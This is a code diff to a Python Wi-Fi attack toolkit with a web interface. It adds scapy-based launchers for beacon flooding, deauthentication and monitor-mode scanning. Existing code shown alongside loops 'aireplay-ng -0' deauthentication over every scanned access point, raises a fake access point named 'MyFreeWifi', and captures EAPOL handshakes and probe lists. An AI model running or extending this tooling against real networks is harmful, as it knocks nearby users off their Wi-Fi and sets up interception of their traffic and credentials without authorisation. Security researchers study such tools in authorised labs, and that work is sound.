@@ -25,7 +25,7 @@ __all__ = ['network_manager_read_conf', 'change_mac', 'set_tcpdump_eapol',
            'get_ls_sys_class_net', 'set_create_ap', 'connecting_aps',
            'get_system_connections', 'set_airodump_manufacturer_uptime_wps',
            'get_dmesg_wlan', 'set_airodump_channel_36_177', 'set_tcpdump_pnl',
-           'set_send_beacon', 'set_new_mac']
+           'set_scapy_beacon', 'set_scapy_deauthentication', 'set_scapy_scan']
 
 FINISH = "<h2><font color='red'>FINISH</font></h2>"
 NOT_FOUND = "<h2><font color='red'>NOT FOUND</font></h2>"
@@ -279,7 +279,7 @@ def set_mdk3_fake_ap():
     return FINISH
 
 
-def set_send_beacon():
+def set_scapy_beacon():
     cmd = f"xterm -e python3 {BEACON} {WLAN} MyFreeWifi"
     model(cmd=cmd, arg='')
     return FINISH
@@ -295,6 +295,11 @@ def set_aireplay_deauthentication():
     mac = get_iwlist_wlan_scan_mac()
     # cmd = f"xterm -e aireplay-ng -0 0 -D {WLAN}"
     [model(cmd=f"xterm -e aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
+    return FINISH
+
+
+def set_scapy_deauthentication():
+    model(cmd=f"xterm -e python3 {DEAUTH} {WLAN}", arg='')
     return FINISH
 
 
@@ -475,8 +480,15 @@ def set_tcpdump_eapol():
     return FINISH
 
 
+def set_scapy_scan():
+    set_wlan_mode_monitor()
+    cmd = f"gnome-terminal --window -- bash -c 'python3 {SCAN} {WLAN}'"
+    subprocess.run(cmd, shell=True)
+    return FINISH
+
+
 def set_scapy_lan_scan():
-    cmd = "python3 functions/scapy-scan.py"
+    cmd = "python3 functions/scapy-wifi-scan.py"
     result = subprocess.getoutput(cmd)
     if result:
         return get_html('blue', result)
